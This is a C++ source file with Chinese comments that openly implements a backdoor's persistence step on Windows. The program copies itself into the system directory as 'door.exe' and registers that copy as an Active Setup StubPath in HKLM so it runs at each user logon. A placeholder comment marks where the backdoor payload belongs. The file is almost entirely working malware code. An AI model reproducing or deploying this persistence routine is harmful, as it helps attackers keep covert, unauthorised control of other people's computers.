// active.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

//用于修改字符串类型键值
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}


int main(int argc, char* argv[])
{
	HKEY hKey;
    DWORD dwDpt=REG_OPENED_EXISTING_KEY;
	//打开HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}
    long lRet=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,&hKey);
    //不存在则，父子自身文件到系统目录和，加载ActiveX启动
	if (lRet!=ERROR_SUCCESS)
	{
		char SelfFile[MAX_PATH];
		char SystemPath[512];
		//得到系统目录路径
		GetSystemDirectory(SystemPath,sizeof(SystemPath));
		strcat(SystemPath,"\\door.exe");
		//得到自身程序路径
		GetModuleFileName (NULL, SelfFile, MAX_PATH);	
		//复制文件
		CopyFile(SelfFile,SystemPath,true);
		//加载ActiveX启动,一个自定义修改注册表的函数，前面已经多次用到
		CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}","StubPath",SystemPath);
		return 0;
	}
	//否则删除HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}
	RegDeleteKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{E92B03AB-A707-11d2-9CBD-0000F87A369H}");
	//.................后门代码
	return 0;
}
